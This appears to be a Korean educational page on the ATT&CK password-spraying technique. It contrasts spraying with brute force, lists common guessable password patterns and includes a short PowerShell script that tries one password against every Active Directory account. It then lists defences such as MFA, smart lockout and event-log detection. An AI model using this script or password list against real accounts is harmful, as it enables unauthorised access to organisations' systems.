T1110.003: Password Spraying

Credential Access

Password Spraying

하나의 비밀번호로 수백 개의 계정을 동시에 노크하는 공격

#1. Password Spraying이란?

"모든 문에 같은 열쇠" 비유

Brute Force가 한 자물쇠에 수만 개의 열쇠를 시도하는 것이라면, Password Spraying은 하나의 흔한 열쇠("Spring2026!")로 수백 개의 자물쇠(계정)를 시도하는 것입니다. 한 계정당 1-2회만 시도하므로 계정 잠금을 우회할 수 있습니다.

Brute Force (기존)

1계정 x 10,000 비밀번호

계정 잠금 발생!

Password Spraying

1,000계정 x 1 비밀번호

계정 잠금 우회!

#2. 공격 기법

자주 사용되는 비밀번호 패턴

  • 계절+연도: Spring2026!, Summer2025!, Winter2026!
  • 회사명+숫자: Company123!, Corp2026!
  • 키보드 패턴: Qwerty123!, Qaz2wsx!
  • 기본 비밀번호: Welcome1!, Password1!, P@ssw0rd!
# Spray-Passwords.ps1 (AD 환경)
$users = Get-ADUser -Filter * | Select -Expand SamAccountName
foreach ($u in $users) {
$pass = ConvertTo-SecureString "Spring2026!" -AsPlainText -Force
$cred = New-Object PSCredential($u, $pass)
try { Get-ADUser -Identity $u -Credential $cred }
catch { } # 실패 시 무시
}

방어 방법

  • MFA(다중 인증): 비밀번호만으로 로그인 불가
  • 스마트 잠금: Azure AD Smart Lockout으로 분산 시도 탐지
  • 비밀번호 정책: 금지 비밀번호 목록에 흔한 패턴 추가
  • Event ID 4771/4776: 다수 계정에 대한 인증 실패 패턴 탐지
